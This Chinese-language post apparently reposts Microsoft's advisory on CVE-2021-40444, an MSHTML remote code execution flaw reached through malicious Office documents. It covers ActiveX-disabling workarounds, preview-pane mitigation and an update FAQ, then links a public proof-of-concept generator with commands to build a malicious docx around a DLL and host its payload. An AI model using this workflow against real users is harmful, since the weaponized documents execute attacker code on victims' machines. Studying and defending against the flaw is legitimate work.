## 漏洞描述

Microsoft 正在调查 MSHTML 中一个影响 Microsoft Windows 的远程代码执行漏洞的报告。Microsoft
发现，存在尝试通过特别设计的 Microsoft Office 文档利用此漏洞的针对性攻击。

攻击者可制作一个由托管浏览器呈现引擎的 Microsoft Office 文档使用的恶意 ActiveX
控件。然后，攻击者必须诱使用户打开此恶意文件。在系统上配置为具有较少用户权限的用户帐户比具有管理员权限的用户帐户所受影响要小。

Microsoft Defender 防病毒和 Microsoft Defender for Endpoint
均提供检测和防范已知漏洞的功能。客户应将反恶意软件产品保持最新状态。使用自动更新的客户不需要采取其他措施。管理更新的企业客户应当选择检测版本
1.349.22.0 或更新版本，以将其部署于整个用户环境中。Microsoft Defender for Endpoint
警报将显示为：“Suspicious Cpl File Execution”。

完成此调查后，Microsoft 将采取有助于保护客户的适当措施。这可能包括，通过月度发布流程提供安全更新程序，或根据客户需求不定期提供安全更新程序。

请参阅 **缓解措施** 和 **解决方法** 部分，以了解有关保护您的系统免受此漏洞影响之措施的重要信息。

 **更新** 2021 年 9 月 14 日：Microsoft
已发布安全更新来解决此漏洞。有关适用于您系统的更新，请参阅“安全更新”表。我们建议您立即安装这些更新。请参阅常见问题解答，以了解适用于您系统的重要信息。

  

## 解决办法

在 Internet Explorer 中禁用所有 ActiveX 控件可以缓解这种攻击。这可以通过使用“本地组策略编辑器”配置组策略 **或**
更新注册表在所有站点中实现。之前安装的 ActiveX 控件将继续运行，但是不会受此漏洞的影响。

 **如需通过组策略禁用 ActiveX 控件。**

在组策略设置中，导航到计算机配置 > 管理模板 > Windows 组件 > Internet Explorer > Internet 控制面板 >
安全页面

对于每个区域：

  1. 选择区域（Internet 区域、Intranet 区域、本地计算机区域或受信任的站点区域）。
  2. 双击 **下载签名的 ActiveX 控件** 并 **启用** 政策。然后将政策中的选项设置为 **停用** 。
  3. 双击 **下载未签名的 ActiveX 控件** 并 **启用** 政策。然后将政策中的选项设置为 **停用** 。

我们建议将此设置应用至所有区域，以充分保护您的系统。

 **变通办法的影响。**

这可将所有 64 位和 32 位进程的 Internet 区域的 URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和
URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为禁用 (3)。 新的 ActiveX
控件将不会安装。之前安装的 ActiveX 控件将继续运行。

 **如需在单个系统中通过 RegKey 禁用 ActiveX 控件：**

 **警告** 如果您不正确地使用注册表编辑器，则可能会导致严重问题（您或许需要重新安装操作系统）。Microsoft
不保证您可以解决因错误使用注册表编辑器而产生的问题。使用注册表编辑器的风险由您自己承担。

  1. 如需在所有区域的 Internet Explorer 中禁用安装 ActiveX 控件，将以下内容粘贴到文本文件中，并使用 .reg 文件扩展名进行保存：

    
    
    Windows Registry Editor Version 5.00
    
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0]
    "1001"=dword:00000003
    "1004"=dword:00000003
    
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1]
    "1001"=dword:00000003
    "1004"=dword:00000003
    
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
    "1001"=dword:00000003
    "1004"=dword:00000003
    
    [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3]
    "1001"=dword:00000003
    "1004"=dword:00000003
    

  2. 双击 .reg 文件将其应用到您的策略配置单元中。
  3. 重新启动系统，以确保应用新配置。

 **变通办法的影响。**

这可将所有 64 位和 32 位进程的 Internet 区域的 URLACTION_DOWNLOAD_SIGNED_ACTIVEX (0x1001) 和
URLACTION_DOWNLOAD_UNSIGNED_ACTIVEX (0x1004) 设置为禁用 (3)。 新的 ActiveX
控件将不会安装。之前安装的 ActiveX 控件将继续运行。

 **如何撤消变通办法**

删除之前在实施变通办法过程中添加的注册表项。

 **如需在 Windows Explorer 中禁用预览**

禁用 Shell Preview 可防止用户在 Windows Explorer 中预览文档。针对您想防止预览的各类文档，请执行以下步骤：

  1. 在注册表编辑器中，导航至合适的注册表项：

对于 Word 文档：

    
    
    HKEY_CLASSES_ROOT.docx\ShellEx{8895b1c6-b41f-4c1c-a562-0d564250836f}
    HKEY_CLASSES_ROOT.doc\ShellEx{8895b1c6-b41f-4c1c-a562-0d564250836f}
    HKEY_CLASSES_ROOT.docm\ShellEx{8895b1c6-b41f-4c1c-a562-0d564250836f}

对于多格式文本文件：

    
    
    HKEY_CLASSES_ROOT.rtf\ShellEx{8895b1c6-b41f-4c1c-a562-0d564250836f}

  2. 导出 RegKey 的副本以备份。
  3. 双击 **名称** 并在 **编辑字符串** 对话框中，删除“数值数据”。
  4. 单击 **确定** 。

 **变通办法的影响**

用户将无法在 Windows Explorer 中预览文档。

 **如何撤消变通办法**

双击您在变通办法步骤二中创建的 .reg 文件。

## 常见问题解答

 **“安全更新”表中列有适用于 Windows 8.1、Windows Server 2012 R2 和 Windows Server 2012
的三类更新。我需要在我的系统中安装什么更新来免受此漏洞的影响？**

运行 Windows 8.1、Windows Server 2012 R2 或 Windows Server 2012 的客户可应用下列选项 **之一**
：月度汇总或仅安全更新和 IE 累积更新。

 **我运行的是 Windows 7、Windows Server 2008 R2 或 Windows Server 2008。我需要应用月度汇总和 IE
累积更新吗？**

  * Windows 7、Windows Server 2008 R2 和 Windows Server 2008 的月度汇总中包含此漏洞的更新。应用月度汇总的客户无需再应用 IE 累积更新。
  * 只应用仅安全更新的客户还需要应用 IE 累积更新，以免受此漏洞的影响。

## CVE-2021-40444 PoC

### 项目地址:

GitHub:
[github.com/lockedbyte/CVE-2021-40444](https://github.com/lockedbyte/CVE-2021-40444)

CVE-2021-40444（Microsoft Office Word 远程代码执行）恶意 docx 生成器利用工具 .

此脚本的创建基于对野外使用的示例的一些逆向工程：

    
    
    938545f7bbe40738908a95da8cdeabb2a11ce2ca36b0f6a74deda9378d380a52（docx 文件）

你需要先安装lcab ( `sudo apt-get install lcab`)

    
    
    sudo apt-get install lcab

检查`REPRODUCE.md`手动复制步骤

如果您生成的 cab 不起作用，请尝试将exploit.html URL 指向calc.cab

### 使用方法

首先生成一个给定 DLL 的恶意 docx 文档，您可以使用从调用中`test/calc.dll`弹出 a 的那个`calc.exesystem()`

    
    
    python3 exploit.py generate test/calc.dll http://<SRV IP>
    
    

![](https://image.3001.net/images/20210919/1632066467_61475ba3908ecee64b011.jpg!small)  

生成恶意 docx（将位于`out/`）后，您可以设置服务器：

    
    
    sudo python3 exploit.py host 80
    

![](https://image.3001.net/images/20210919/1632066485_61475bb58ecef684213de.jpg!small)  

最后在 Windows 虚拟机中尝试 docx：打开word成功弹出计算器.

![](https://image.3001.net/images/20210919/1632066494_61475bbeccf5d9f3007fa.jpg!small)  

poc下载地址:

[https://github.com/lockedbyte/CVE-2021-40444](https://github.com/lockedbyte/CVE-2021-40444/archive/refs/heads/master.zip)

